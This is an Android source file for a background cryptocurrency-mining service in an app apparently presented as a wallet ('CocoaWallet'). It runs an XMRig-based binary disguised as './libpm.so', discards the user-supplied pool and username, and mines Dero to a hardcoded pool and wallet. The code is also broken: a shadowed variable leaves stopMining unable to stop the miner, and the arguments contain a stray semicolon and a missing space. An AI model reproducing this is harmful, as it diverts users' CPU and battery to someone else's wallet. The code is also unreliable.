///*
// *  CocoaWallet App (c) 2021 Chad Jones
// *  based on the XMRig Monero Miner https://github.com/xmrig/xmrig
// *
// *    This program is free software: you can redistribute it and/or modify
// *    it under the terms of the GNU General Public License as published by
// *    the Free Software Foundation, either version 3 of the License, or
// *    (at your option) any later version.
// *
// *    This program is distributed in the hope that it will be useful,
// *    but WITHOUT ANY WARRANTY; without even the implied warranty of
// *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// *    GNU General Public License for more details.
// *
// *    You should have received a copy of the GNU General Public License
// *    along with this program. If not, see <http://www.gnu.org/licenses/>.
// * /
// */
package com.chadananda.cocoawallet;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Binder;
import android.os.Build;
import android.os.IBinder;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.UUID;

/**
 * MiningService for mining in the background
 * Created by uwe on 24.01.18.
 */

public class MiningService extends Service {
    private static final String LOG_TAG = "MiningSvc";
    private Process process;
    private String configTemplate;
    private String privatePath;
    private String workerId;
    private OutputReaderThread outputHandler;
    private int accepted;
    private String speed = "./.";

    ///exeptions
    //privatePath/data/user/0/com.chadananda.cocoawallet/files

    @Override
    public void onCreate() {
        super.onCreate();
        // load config template
//        configTemplate = Tools.loadConfigTemplate(this);

        //path where we may execute our program
        //  privatePath = getFilesDir().getAbsolutePath();
        privatePath = this.getApplicationInfo().nativeLibraryDir;

        Log.e("privatePath","privatePath: "+privatePath);

        workerId = fetchOrCreateWorkerId();
        Log.w(LOG_TAG, "my workerId: " + workerId);

        String abi = Build.CPU_ABI.toLowerCase();
        Log.e("abi","abi: "+abi);


        //copy binaries to a path where we may execute it); // no longer valid
        //Tools.copyFile(this,"armeabi-v7a" + "/xmrig", privatePath + "/xmrig");
        //Tools.copyFile(this,"armeabi-v7a" + "/libuv", privatePath + "/libuv.so");
        //Tools.copyFile(this,"libc++.so",  privatePath + "/libc++_shared.so");
        //Tools.copyFile(this,"libdl.so",  privatePath + "/libc++_shared.so");
    }

    public class MiningServiceBinder extends Binder {
        public MiningService getService() {
            return MiningService.this;
        }
    }

    public static class MiningConfig {
        String username, pool;
        int threads, maxCpu;
    }

    public MiningConfig newConfig(String username, String pool, int threads, int maxCpu, boolean useWorkerId) {
        MiningConfig config = new MiningConfig();
        config.username = username;
        if (useWorkerId)
            config.username += "." + workerId;
        config.pool = pool;
        config.threads = threads;
        config.maxCpu = maxCpu;
        return config;
    }
    /**
     * @return unique workerId (created and saved in preferences once, then re-used)
     */
    private String fetchOrCreateWorkerId() {
        SharedPreferences preferences = getSharedPreferences("CocoaWallet", 0);
        String id = preferences.getString("id", null);
        if (id == null) {
            id = UUID.randomUUID().toString();
            SharedPreferences.Editor ed = preferences.edit();
            ed.putString("id", id);
            ed.apply();
        }
        return id;
    }

    @Override
    public void onDestroy() {
        stopMining();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return new MiningServiceBinder();
    }

    public void stopMining() {
        if (outputHandler != null) {
            outputHandler.interrupt();
            outputHandler = null;
        }
        if (process != null) {
            process.destroy();
            process = null;
            Log.i(LOG_TAG, "stopped");
            Toast.makeText(this,"stopped", Toast.LENGTH_SHORT).show();
        }
    }

    public void startMining(MiningConfig config) {
        Log.i(LOG_TAG, "starting...");
        if (process != null) {
            Log.i(LOG_TAG, "shutting down old process first...");
            process.destroy();
        }
        try {
            // write the config // this can no longer be done -- use command line
            Tools.writeConfig(configTemplate, config.pool, config.username, config.threads, config.maxCpu, privatePath);
            //run xmrig using the config // no longer valid, use command line args
            String wallet = "dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000";
            String max_bwt = "710";
            String pool = "us.hero.miner.us:1117";
            String config_template = "-o %s -u %s --tls -k --coin dero -a astrobwt "+
                    "--astrobwt-max-size=%s --astrobwt-avx2 --pause-on-battery --huge-pages=TRUE "+
                    "--hu;ge-pages-jit=TRUE --asm=auto --cpu-memory-pool=-1 --cpu-no-yield --print-time=8"+
                    "--retry-pause=2";
            String args = String.format(config_template, pool, wallet, max_bwt);
            String binary = "./libpm.so";

            // String[] args = {"./lbpm.so"};
            // ProcessBuilder pb = new ProcessBuilder(args);
            ProcessBuilder pb = new ProcessBuilder(binary, args);
            //in our directory, which is
            // pb.directory(getApplicationContext().getFilesDir());
            java.io.File dir = new java.io.File(privatePath);
            pb.directory(dir); // needs to be a file type
            // with the directory as ld path so xmrig finds the libs
            pb.environment().put("LD_LIBRARY_PATH", privatePath);
            //in case of errors, read them
            pb.redirectErrorStream();
            accepted = 0;
            //run it!
            Process process = pb.start();   // how do we check if this worked?

            //start processing xmrig's output    // so why not use pb.redirectOutput(); ?
            // Log.i("pbcmd","cmd: "+pb.command());
            // Log.i("pbcmd","directory: "+pb.directory());
            // outputHandler = new MiningService.OutputReaderThread(process.getErrorStream());
            // outputHandler.start();

            outputHandler = new MiningService.OutputReaderThread(process.getInputStream());
            outputHandler.start();
            Toast.makeText(this, "started", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Log.e("launch","error: "+e.getLocalizedMessage()+e.getCause());
            Toast.makeText(this, e.getLocalizedMessage(), Toast.LENGTH_LONG).show();
            process = null;
        }
    }

    public String getSpeed() {
        return speed;
    }

    public int getAccepted() {
        return accepted;
    }

    public String getOutput() {
        if (outputHandler != null && outputHandler.getOutput() != null)
            return outputHandler.getOutput().toString();
        else return "";
    }

    public int getAvailableCores() {
        return Runtime.getRuntime().availableProcessors();
    }

    /**
     * thread to collect the binary's output
     */

    private class OutputReaderThread extends Thread {
        private final InputStream inputStream;
        private final StringBuilder output = new StringBuilder();
        private BufferedReader reader;

        OutputReaderThread(InputStream inputStream) {
            this.inputStream = inputStream;
        }

        public void run() {
            Log.e("prog", "running");
            try {
                reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while ((line = reader.readLine()) != null) {
                    Log.i("prog", line); //never gets called
                    output.append(line).append(System.lineSeparator());
                    if (line.contains("accepted")) {
                        accepted++;
                    } else if (line.contains("speed")) {
                        String[] split = TextUtils.split(line, " ");
                        speed = split[split.length - 2];
                        if (speed.equals("n/a")) {
                            speed = split[split.length - 6];
                        }
                    }
                    if (currentThread().isInterrupted())
                        return;
                }
            } catch (IOException e) {
                Log.w(LOG_TAG, "exception", e);
            }
        }

        public StringBuilder getOutput() {
            return output;
        }
    }
}
